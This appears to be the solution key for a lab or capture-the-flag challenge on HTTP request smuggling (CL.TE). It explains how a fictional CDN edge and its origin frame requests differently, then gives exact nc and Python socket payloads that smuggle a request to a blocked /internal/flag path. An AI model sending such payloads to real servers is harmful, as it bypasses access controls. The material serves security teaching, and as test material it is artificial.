# http/smuggle-cl-te — SmuggleClTe (location-locked, high)

**EdgeMesh CDN**: a raw-TCP edge front (`:8080`, hand-rolled HTTP parser) proxies to the origin app (`:8081`, base express runtime). **Raw sockets only** — `nc` / python `socket` (arch §8; curl and browsers normalize framing).

**Bug (CL.TE):** for requests carrying **both** `Content-Length` and `Transfer-Encoding`, the FRONT frames the message by `Content-Length` but forwards it with `Content-Length` **removed** and `Transfer-Encoding: chunked` **preserved**. The origin frames by TE → the request boundary desyncs: bytes the front counted as *body* are re-parsed by the origin as the *next request*.
**Lock:** the origin serves `GET /internal/flag`, but the edge answers **403** for every request **it parses** whose path starts with `/internal`. The front parses *all* subsequent requests on a connection, so the smuggled prefix must hide **inside the CL-counted body** (after the `0`-chunk terminator).

## Intended path (exact bytes, single connection)
```sh
printf 'POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\nContent-Length: 66\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n' | nc victim.target.lab 8119
```
- `Content-Length: 66` = 5 bytes `0\r\n\r\n` + the 61-byte smuggled request — the front consumes all 66 as body; the origin's chunked parser ends the body at `0\r\n\r\n` and parses the rest as a new request.
- You receive two responses: the `POST /home` response, then the smuggled `GET /internal/flag` response containing the flag.

Python (same bytes):
```python
import socket
p = (b"POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\n"
     b"Content-Length: 66\r\nTransfer-Encoding: chunked\r\n\r\n"
     b"0\r\n\r\n"
     b"GET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n")
s = socket.create_connection(("victim.target.lab", 8119)); s.sendall(p)
import time; time.sleep(1); print(s.recv(65536).decode("latin1"))
```
Check the lock first: `printf 'GET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n' | nc victim.target.lab 8119` → 403 at the edge.

**Flag:** `DSLTV{HTTP-SmuggleClTe-<9 digits>}` (from the origin's `/internal/flag`, only reachable via the desync).
